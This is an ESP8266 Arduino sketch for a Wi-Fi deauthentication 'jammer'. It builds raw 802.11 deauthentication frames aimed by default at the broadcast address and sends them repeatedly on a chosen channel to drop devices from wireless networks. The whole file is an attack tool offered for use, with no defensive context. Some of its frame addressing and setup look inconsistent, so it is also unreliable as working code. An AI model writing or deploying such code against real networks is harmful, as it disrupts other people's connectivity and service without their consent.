#include <ESP8266WiFi.h>

// Define variables for Wi-Fi scanning
const int CHANNEL = 1;           // Wi-Fi channel to jam (1-14)
const int JAMMING_DURATION = 10; // Duration of jamming in seconds

// MAC address to target (optional, or leave as broadcast)
uint8_t targetMac[] = {0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF};

// Function to send deauthentication packets
void sendDeauthPacket(uint8_t *mac, uint8_t channel) {
  uint8_t deauthPacket[26] = {
      0xC0, 0x00, 0x3A, 0x01,                       // Frame control
      mac[0], mac[1], mac[2], mac[3], mac[4], mac[5], // Receiver MAC (target)
      0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,           // Sender MAC (broadcast)
      mac[0], mac[1], mac[2], mac[3], mac[4], mac[5], // BSSID (target)
      0x00, 0x00,                                   // Sequence number
      0x07, 0x00,                                   // Reason code (7 = Class 3 frame received from nonassociated STA)
  };

  WiFi.begin(); // Ensures the Wi-Fi chip is initialized
  WiFi.disconnect();
  delay(1);

  // Set Wi-Fi channel
  wifi_set_channel(channel);

  // Send the packet 100 times for effective jamming
  for (int i = 0; i < 100; i++) {
    wifi_send_pkt_freedom(deauthPacket, 26, 0);
    delay(10); // Slight delay between packets
  }
}

void setup() {
  Serial.begin(115200); // Start the Serial Monitor for debugging

  // Initialize Wi-Fi
  WiFi.mode(WIFI_STA);
  WiFi.disconnect();
  delay(100);

  Serial.println("Wi-Fi jammer ready");
  Serial.print("Targeting channel: ");
  Serial.println(CHANNEL);
  delay(1000);
}

void loop() {
  // Send deauthentication packets for the specified duration
  for (int i = 0; i < JAMMING_DURATION * 10; i++) {
    sendDeauthPacket(targetMac, CHANNEL);
  }

  Serial.println("Jamming completed");
  delay(5000); // Delay before re-running the jamming loop
}
